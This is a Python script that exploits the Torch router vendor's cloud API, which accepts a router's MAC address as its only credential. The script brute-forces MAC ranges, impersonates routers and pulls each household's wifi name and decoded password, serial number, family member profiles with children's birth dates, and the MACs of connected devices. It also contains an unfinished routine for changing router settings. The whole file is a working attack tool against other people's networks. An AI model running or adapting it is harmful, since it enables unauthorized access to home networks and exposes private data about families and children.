import urllib2
import itertools
import pprint
import json
import os
import argparse
parser = argparse.ArgumentParser()

parser.add_argument('mac_address',
                    help="MAC address of the Torch router.  Known good ranges: 88:dc:96:57:67:xx, 88:DC:96:0E:13:xx, and 88:dc:96:52:00:xx, 'bruteforce' also works")
parser.add_argument('--firmware', help='Find the most recent firmware and download link', action='store_true', default=False)
parser.add_argument('--profiles', help='Identify connected devices and groups', action='store_true', default=False)
parser.add_argument('--config', help='Get router config including wifi name and password', action='store_true', default=False)
parser.add_argument('--blacklist', help='This seems to always be a 404 device not found error', action='store_true', default=False)
parser.add_argument('--blocking', help='? not yet identified what it returns', action='store_true')
parser.add_argument('--settings', help='? not yet identified what it returns', action='store_true')
parser.add_argument('--loggedin', help='? not yet identified what it returns', action='store_true')
parser.add_argument('--all', help='Get all data', action='store_true', default=True)

args = parser.parse_args()

#if any but all, set all to off
if args.firmware or args.profiles or args.config or args.blacklist or args.blocking or args.loggedin:
  args.all = False

# if all, set them on
if args.all:
  args.blacklist = False #since this is always 404 from what i can tell, keep it off
  args.blocking = True
  args.firmware = True
  args.profiles = True
  args.config = True

#look like the router
headers = { 'User-Agent' : 'curl/7.42.1',
            "x-router-mac": "",
            "Content-Type": "application/json"}

class Unauthorized(Exception):
    pass

def update_settings(mac, headers):
  #WIP
  return
  headers['x-router-mac'] = mac
  req = urllib2.Request('http://home.mytorch.com/', headers=headers)
  response = urllib2.urlopen(req)
  cookies=response.info()['Set-Cookie']
  print(cookies)
  data = {"safeSearch":True,
           "monitoredSSid":"r-guest",
           "firmwareVersion":"1.5.7",
           "macAddress":"88:dc:96:57:67:44",
           "lastFirmwareUpdateAt":"2017-02-26T14:46:32.599Z",
           "monitoredPassword":"youarebeingmonitored",
           "monitoredPasswordConfirm":"youarebeingmonitored",
           "timezone":"US/Eastern"}
  req = urllib2.Request('http://home.mytorch.com/torch/dashboard/router/settings', headers=headers, data=json.dumps(data))
  req.add_header("Cookie", cookies)
  req.get_method = lambda: 'PUT' #needs a put request
  response = urllib2.urlopen(req)
  the_page = response.read()
  the_page = json.loads(the_page)
  print(response.code)
  #return the_page

def get_loggedin_users(mac, headers):
  #WIP
  return
  headers['x-router-mac'] = mac
  req = urllib2.Request('http://home.mytorch.com/users/loggedin', headers=headers)
  response = urllib2.urlopen(req)
  the_page = response.read()
  print 'loggedin: ',the_page
  the_page = json.loads(the_page)
  return the_page

def get_firmware(mac, headers):
  headers['x-router-mac'] = mac
  req = urllib2.Request('http://home.mytorch.com/api/v1/router/firmware', headers=headers)
  response = urllib2.urlopen(req)
  the_page = response.read()
  the_page = json.loads(the_page)
  return the_page

def get_blacklist(mac, headers):
  headers['x-router-mac'] = mac
  req = urllib2.Request('http://api.mytorch.com/api/v1/devices/blacklist', headers=headers)
  response = urllib2.urlopen(req)
  the_page = response.read()
  the_page = json.loads(the_page)
  return the_page

def get_blocking(mac, headers):
  headers['x-router-mac'] = mac
  req = urllib2.Request('http://api.mytorch.com/api/v1/devices/blocking', headers=headers)
  response = urllib2.urlopen(req)
  the_page = response.read()
  the_page = json.loads(the_page)
  return the_page

def get_profile(mac, headers):
  headers['x-router-mac'] = mac
  req = urllib2.Request('http://api.mytorch.com/api/v1/profiles', headers=headers)
  try:
    response = urllib2.urlopen(req)
  except urllib2.HTTPError, e:
    if hasattr(e, 'code'):
      if e.code == 401:
        raise Unauthorized("  Unauthorized, MAC is invalid")
  the_page = response.read()
  if "unauthorized" in the_page:
    raise Unauthorized("  Unauthorized, MAC is invalid")
  the_page = json.loads(the_page)
  return the_page

def get_router_config(mac, headers):
  headers['x-router-mac'] = mac
  # could also hit up home.mytorch.com/torch/front/router, looks to have pretty much the same info...
  req = urllib2.Request('http://api.mytorch.com/api/v1/router', headers=headers)
  response = urllib2.urlopen(req)
  the_page = response.read()
  the_page = json.loads(the_page)
  return the_page

def deobfuscate_wifi_password(password):
  password = list(password)
  password.reverse()
  password = os.popen("echo %s | xxd -r -p" %(''.join(password))).read()
  return(password)

macs = []

if args.mac_address == "bruteforce":
  charset="ABCDEFG0123456789"
  for candidate in itertools.product(charset, repeat=2):
    candidate = ''.join(candidate)
    if len(candidate) == 1:
      continue
    macs.append('88:dc:96:57:67:%s'%(candidate))
    macs.append('88:dc:96:52:50:%s'%(candidate))
    macs.append('88:DC:96:0E:13:%s'%(candidate))
else:
  macs = [args.mac_address]

for mac in macs:
  w = open(mac,'w')
  print("MAC: %s" %(mac))
  try:
    profiles = get_profile(mac, headers)
  except Unauthorized:
    continue #skip to next
  if args.settings:
    update_settings(mac, headers)
  if args.loggedin:
    login = get_loggedin_users(mac, headers)
    print(login)
  if args.config:
    config = get_router_config(mac, headers)
    technical = config.get('data').get('technical')
    print("Hardware Version: %s" %(technical.get('hardwareVersion')))
    print("Firmware Version: %s" %(technical.get('firmwareVersion')))
  if args.firmware:
    firmware = get_firmware(mac, headers)
    print("Most Recent Firmware: %s from %s" %(firmware['data']['version'], firmware['data']['url']))
  if args.config:
    print("Wifi SSID: %s"%(technical.get('monitoredSSid')))
    print("Wifi Password: %s"%(deobfuscate_wifi_password(technical.get('monitoredPassword'))))
    print("Timezone: %s"%(technical.get('timezone')))
    print("Serial: %s"%(technical.get('serialNumber')))
  if args.profiles:
    print("Profiles (%s)" %(len(profiles['data'])))
    for profile in profiles['data']:
      print("  Name: %s" %(profile['name']))
      print("  Adult: %s" %(profile['isAdult']))
      print("  Birthday: %s/%s" %(profile['birthdate']['month'],profile['birthdate']['year']))
      print("  Devices: (%s)" %(len(profile['devices'])))
      for device in profile['devices']:
        print("    Name: %s (%s) - MAC: %s" %(device['name'],device['systemName'], device['technical']['macAddress']))

  if args.blacklist:
    black = get_blacklist(mac,headers)
    import pprint
    pprint.pprint(black)
  if args.blocking:
    black = get_blocking(mac,headers)
    import pprint
    pprint.pprint(black)
  print("-----------------------------------------------------------------------------------------------")
